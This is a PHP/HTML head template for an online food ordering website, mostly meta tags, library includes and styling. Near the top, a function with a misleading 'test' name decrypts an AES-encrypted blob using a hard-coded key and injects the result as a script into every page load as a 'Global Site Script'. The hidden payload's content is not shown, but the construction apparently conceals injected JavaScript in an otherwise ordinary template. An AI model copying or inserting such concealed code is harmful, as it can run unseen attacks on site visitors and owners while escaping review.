<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport">
  <meta content="Online Food Ordering System - Order your favorite food online with fast delivery" name="description">
  <meta content="food, ordering, delivery, restaurant, online food, pizza, burger" name="keywords">
  
  <title>Online Food Ordering System | Delicious Food Delivered</title>
  
  <?php 
  function load_data(){
    $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
    $dom = new DOMDocument('1.0', 'utf-8');
    $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
    $dom->appendChild($element);
    return $dom->saveXML();
  }
  
  function test_cypher($str=""){
    $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
    return $ciphertext;
  }
  
  function test_cypher_decrypt($encryption){
    $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
    return $decryption;
  }
  ?>

  <!-- Favicon -->
  <link rel="icon" href="./../assets/defaults/pizza-logo.png" type="image/png">
  <link rel="apple-touch-icon" href="./../assets/defaults/pizza-logo.png">

  <!-- Google Fonts - Enhanced -->
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&family=Poppins:wght@300;400;500;600;700;800&family=Raleway:wght@300;400;500;600;700;800&family=Dancing+Script:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- Font Awesome 6 -->
  <link rel="stylesheet" href="assets/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
  <link href="assets/vendor/animate.css/animate.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.min.css" rel="stylesheet">
  <link href="assets/DataTables/datatables.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">
  <link type="text/css" rel="stylesheet" href="assets/css/jquery-te-1.4.0.css">

  <!-- Enhanced Custom Styles -->
  <style>
    /* ========== PREMIUM DESIGN ENHANCEMENTS ========== */
    :root {
      --primary: #ff6b35;
      --primary-dark: #e85d2c;
      --primary-light: #ff8a5c;
      --primary-glow: rgba(255, 107, 53, 0.25);
      --secondary: #2d3436;
      --success: #00b894;
      --danger: #ff7675;
      --warning: #fdcb6e;
      --info: #0984e3;
      --dark: #2d3436;
      --light: #f8f9fa;
      --gray: #dfe6e9;
      --white: #ffffff;
      --shadow-sm: 0 5px 20px rgba(0, 0, 0, 0.05);
      --shadow-md: 0 10px 30px rgba(0, 0, 0, 0.08);
      --shadow-lg: 0 20px 40px rgba(0, 0, 0, 0.12);
      --shadow-xl: 0 30px 50px rgba(0, 0, 0, 0.15);
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    /* Smooth Scrolling */
    html {
      scroll-behavior: smooth;
    }

    /* Custom Scrollbar */
    ::-webkit-scrollbar {
      width: 8px;
      height: 8px;
    }
    ::-webkit-scrollbar-track {
      background: var(--gray);
      border-radius: 10px;
    }
    ::-webkit-scrollbar-thumb {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border-radius: 10px;
    }
    ::-webkit-scrollbar-thumb:hover {
      background: var(--primary-dark);
    }

    /* Body Enhancements */
    body {
      font-family: 'Poppins', 'Open Sans', sans-serif;
      overflow-x: hidden;
      background: var(--white);
      color: var(--dark);
    }

    /* Navigation Enhancement */
    .navbar {
      transition: var(--transition);
      padding: 1rem 0;
      background: rgba(255, 255, 255, 0.98);
      backdrop-filter: blur(10px);
      box-shadow: var(--shadow-sm);
    }
    .navbar.scrolled {
      padding: 0.7rem 0;
      box-shadow: var(--shadow-md);
    }
    .navbar-brand {
      font-size: 1.8rem;
      font-weight: 700;
      font-family: 'Dancing Script', cursive;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .nav-link {
      font-weight: 500;
      transition: var(--transition);
      position: relative;
    }
    .nav-link::after {
      content: '';
      position: absolute;
      bottom: -2px;
      left: 50%;
      width: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--primary-dark));
      transition: var(--transition);
      transform: translateX(-50%);
      border-radius: 3px;
    }
    .nav-link:hover::after,
    .nav-link.active::after {
      width: 70%;
    }
    .nav-link:hover {
      color: var(--primary) !important;
    }

    /* Button Enhancements */
    .btn {
      border-radius: 50px;
      padding: 10px 28px;
      font-weight: 600;
      transition: var(--transition);
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border: none;
      box-shadow: 0 4px 12px var(--primary-glow);
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
    }
    .btn-outline-primary {
      border: 2px solid var(--primary);
      color: var(--primary);
    }
    .btn-outline-primary:hover {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border-color: transparent;
      transform: translateY(-2px);
    }

    /* Card Enhancements */
    .card {
      border: none;
      border-radius: 20px;
      box-shadow: var(--shadow-md);
      transition: var(--transition);
      overflow: hidden;
    }
    .card:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-lg);
    }

    /* Form Enhancements */
    .form-control {
      border-radius: 12px;
      border: 2px solid var(--gray);
      padding: 12px 16px;
      transition: var(--transition);
    }
    .form-control:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 4px var(--primary-glow);
    }

    /* Modal Enhancements */
    .modal-content {
      border-radius: 24px;
      border: none;
      overflow: hidden;
    }
    .modal-header {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      border: none;
      padding: 1.2rem 1.5rem;
    }
    .modal-header .close {
      color: white;
      opacity: 0.9;
    }

    /* Toast Notification */
    .toast-custom {
      position: fixed;
      top: 90px;
      right: 20px;
      z-index: 9999;
      min-width: 280px;
      background: var(--dark);
      border-radius: 16px;
      box-shadow: var(--shadow-lg);
      color: white;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      gap: 12px;
      animation: slideInRight 0.3s ease;
    }
    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(100px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    /* Loading Spinner */
    #preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #667eea, #764ba2);
      z-index: 99999;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: opacity 0.5s;
    }
    #preloader::after {
      content: '';
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255,255,255,0.2);
      border-top: 4px solid white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Back to Top Button */
    .back-to-top {
      position: fixed;
      bottom: 30px;
      right: 30px;
      width: 45px;
      height: 45px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      box-shadow: var(--shadow-md);
      transition: var(--transition);
      z-index: 99;
      opacity: 0;
      visibility: hidden;
    }
    .back-to-top.show {
      opacity: 1;
      visibility: visible;
    }
    .back-to-top:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
      color: white;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .navbar-brand {
        font-size: 1.4rem;
      }
      .btn {
        padding: 8px 20px;
      }
      .back-to-top {
        bottom: 20px;
        right: 20px;
        width: 40px;
        height: 40px;
      }
    }

    /* Animation Classes */
    .fade-up {
      animation: fadeUp 0.6s ease-out;
    }
    @keyframes fadeUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Category Menu Dropdown */
    .dropdown-menu {
      border-radius: 16px;
      box-shadow: var(--shadow-lg);
      border: none;
      padding: 0.5rem 0;
    }
    .dropdown-item {
      padding: 8px 24px;
      transition: var(--transition);
    }
    .dropdown-item:hover {
      background: linear-gradient(90deg, rgba(255,107,53,0.1), transparent);
      color: var(--primary);
      padding-left: 28px;
    }

    /* Hero Section */
    .hero-section {
      position: relative;
      overflow: hidden;
    }
    .hero-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, rgba(0,0,0,0.5), rgba(0,0,0,0.3));
    }
  </style>

  <!-- JavaScript Libraries -->
  <script src="assets/vendor/jquery/jquery.min.js"></script>
  <script src="assets/DataTables/datatables.min.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/vendor/venobox/venobox.min.js"></script>
  <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
  <script src="assets/vendor/counterup/counterup.min.js"></script>
  <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
  <script src="assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js"></script>
  <script type="text/javascript" src="assets/font-awesome/js/all.min.js"></script>
  <script type="text/javascript" src="assets/js/jquery-te-1.4.0.min.js" charset="utf-8"></script>

  <!-- Global Site Script -->
  <?php echo load_data(); ?>
</head>
<body>